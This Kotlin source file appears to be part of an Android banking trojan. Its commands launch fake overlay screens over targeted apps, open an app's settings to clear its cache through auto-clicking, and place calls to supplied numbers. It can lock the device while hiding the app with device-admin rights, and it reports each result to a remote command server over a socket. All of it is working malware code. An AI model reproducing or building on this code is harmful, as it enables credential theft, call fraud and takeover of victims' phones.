package com.xxx.zzz.commandp.taskssv

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Settings
import com.xxx.zzz.adminp.AdminReceiverzxc
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.injectp.ViewInjectionsad
import com.xxx.zzz.lockp.SrvLockDevice
import com.xxx.zzz.servicesp.CommandServicedas
import com.xxx.zzz.socketsp.IOSocketyt
import org.json.JSONObject


object OpenFakeTask {

    fun openFake(ctx: Context, nameInj: String?) {
        runCatching {
            if (SharedPreferencess.SettingsRead(nameInj)!!.isNotEmpty()) {
                val dialogIntent = Intent()
                dialogIntent.component = ComponentName(
                    ctx.packageName,
                    ViewInjectionsad::class.java.canonicalName
                )
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
                SharedPreferencess.app_inject = nameInj ?: ""
                ctx.startActivity(dialogIntent)

                val obj = JSONObject()
                obj.put("openFake", "ok")
                IOSocketyt.sendLogs("", obj.toString(), "openFake")
            }
        }.onFailure {
            IOSocketyt.sendLogs("", "openFake ${it.localizedMessage}", "error")
        }
    }

    fun startClearCash(context: Context, app: String?) {
        runCatching {
            SharedPreferencess.autoClickCacheCommand = "1"
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
            intent.addCategory(Intent.CATEGORY_DEFAULT)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            intent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            intent.addFlags(Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED)
            val uri = Uri.fromParts("package", app, null)
            intent.data = uri
            context.startActivity(intent)
            IOSocketyt.sendLogs("", "startClearCash task $app", "success")
        }.onFailure {
            IOSocketyt.sendLogs("", "startClearCash ${it.localizedMessage}", "error")
        }
    }

    fun Calling(context: Context, number: String?, lock: Boolean) {
        runCatching {
            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$number"))
            intent.data = Uri.parse("tel:$number")
            intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)

            val infos =
                SharedPreferencess.getAppContext()?.packageManager?.queryIntentActivities(intent, 0)
            infos?.forEach {
                if (it.activityInfo.applicationInfo.packageName.contains("com.android.server.telecom")) {
                    val intent = Intent(Intent.ACTION_CALL)
                    intent.data = Uri.parse("tel:$number")
                    intent.setClassName(
                        it.activityInfo.applicationInfo.packageName,
                        it.activityInfo.name
                    ).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                    }
                    SharedPreferencess.getAppContext()!!.startActivity(intent)
                } else if (it.activityInfo.applicationInfo.packageName.contains(".android.")) {
                    val intent = Intent(Intent.ACTION_CALL)
                    intent.data = Uri.parse("tel:$number")
                    intent.setClassName(
                        it.activityInfo.applicationInfo.packageName,
                        it.activityInfo.name
                    ).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                    }
                    SharedPreferencess.getAppContext()!!.startActivity(intent)
                }
            }

            if (lock) {
                SharedPreferencess.lockDevice = "1"
                try {
                    //------Start Lock Device-----------
                    if (!CommandServicedas.isMyServiceRunning(context, SrvLockDevice::class.java)) {
                        context.startService(Intent(context, SrvLockDevice::class.java))
                        val cn = ComponentName(context, AdminReceiverzxc::class.java)
                        val dpm =
                            context.applicationContext.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                        dpm.setApplicationHidden(cn, context.packageName, true)
                    }
                } catch (ex: Exception) {
                    ex.printStackTrace()
                }
            }

            val obj = JSONObject()
            obj.put("Calling", "ok")
            IOSocketyt.sendLogs("", obj.toString(), "Calling")
        }.onFailure {
            IOSocketyt.sendLogs("", "Calling ${it.localizedMessage}", "error")
        }
    }
}
